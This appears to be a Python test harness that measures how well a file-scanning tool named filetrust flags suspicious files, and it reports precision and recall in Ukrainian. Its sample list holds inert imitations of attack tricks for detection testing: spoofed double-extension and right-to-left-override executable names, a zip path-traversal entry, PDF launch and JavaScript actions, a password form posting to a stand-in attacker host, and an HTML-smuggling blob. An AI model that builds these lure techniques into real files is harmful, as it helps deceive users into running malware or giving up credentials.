
import io
import sys
import tempfile
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
sys.stdout.reconfigure(encoding="utf-8")

from filetrust.pipeline import analyze          
from filetrust.scoring.engine import score     

THRESHOLD = 30   

def make_zip(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for n, data in files.items():
            z.writestr(n, data)
    return buf.getvalue()


def pdf(body: str) -> bytes:
    return (b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog " + body.encode() +
            b" >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")



SAMPLES = [
    # нешкідливі 
    ("notes.txt", b"hello, this is a plain note\n", False),
    ("page.html", b"<html><body><h1>Hi</h1><a href='https://example.com'>site</a></body></html>", False),
    ("clean.pdf", pdf("/Pages 2 0 R"), False),
    ("docs.zip", make_zip({"readme.txt": b"hi", "data.csv": b"a,b\n1,2\n"}), False),
    ("photos.zip", make_zip({"a.txt": b"x" * 1000, "b.txt": b"y" * 1000}), False),
    ("login_info.html", b"<html><body><form action='/search'><input name='q'></form></body></html>", False),
    #  шкідливі імітація  
    ("invoice.pdf.exe", b"MZ" + b"\x00" * 200, True),
    ("report.docx.scr", b"MZ" + b"\x00" * 200, True),
    ("doc\u202egpj.exe", b"MZ" + b"\x00" * 200, True),
    ("setup.zip", make_zip({"setup.exe": b"MZ" + b"\x00" * 100}), True),
    ("scan.zip", make_zip({"scan.pdf.exe": b"MZ" + b"\x00" * 100}), True),
    ("update.zip", make_zip({"../../evil.txt": b"x"}), True),
    ("launch.pdf", pdf("/OpenAction << /S /Launch /F (cmd.exe) >>"), True),
    ("js.pdf", pdf("/OpenAction << /S /JavaScript /JS (app.alert(1)) >>"), True),
    ("embed.pdf", pdf("/Names << /EmbeddedFiles >> /Type /EmbeddedFile /F (payload.exe)"), True),
    ("login.html", b"<html><form action='http://evil-site.xyz/p'><input type='password'></form></html>", True),
    ("invoice.html",
     b"<script>var b=new Blob([atob('TVqQAAMAAAAEAAAA')]);"
     b"var u=URL.createObjectURL(b);</script>", True),
]


def main():
    tp = fp = fn = tn = 0
    rows = []
    with tempfile.TemporaryDirectory() as tmp:
        for i, (name, data, bad) in enumerate(SAMPLES):
            p = Path(tmp) / f"s{i}.bin"
            p.write_bytes(data)
            info, findings = analyze(p, name)
            total, verdict = score(findings)
            flagged = total >= THRESHOLD
            ok = flagged == bad
            if bad and flagged: tp += 1
            elif bad: fn += 1
            elif flagged: fp += 1
            else: tn += 1
            rows.append((name.replace("\u202e", "<RTLO>"), "шкідливий" if bad else "чистий",
                         info.kind, total, verdict.split(" ", 1)[1], "✅" if ok else "❌"))

    n = len(SAMPLES)
    prec = tp / (tp + fp) if tp + fp else 0
    rec = tp / (tp + fn) if tp + fn else 0
    acc = (tp + tn) / n

    out = ["| Зразок | Очікуємо | Тип | Бал | Вердикт | OK |", "|---|---|---|---|---|---|"]
    out += [f"| {r[0]} | {r[1]} | {r[2]} | {r[3]} | {r[4]} | {r[5]} |" for r in rows]
    out += ["", f"Зразків: {n} (шкідливих {tp + fn}, чистих {tn + fp}), поріг {THRESHOLD} балів",
            f"TP={tp}  FN={fn}  FP={fp}  TN={tn}",
            f"Точність (precision): {prec:.0%}   Повнота (recall): {rec:.0%}   Загальна точність: {acc:.0%}"]
    text = "\n".join(out)
    print(text)
    Path(__file__).with_name("results.md").write_text(text + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
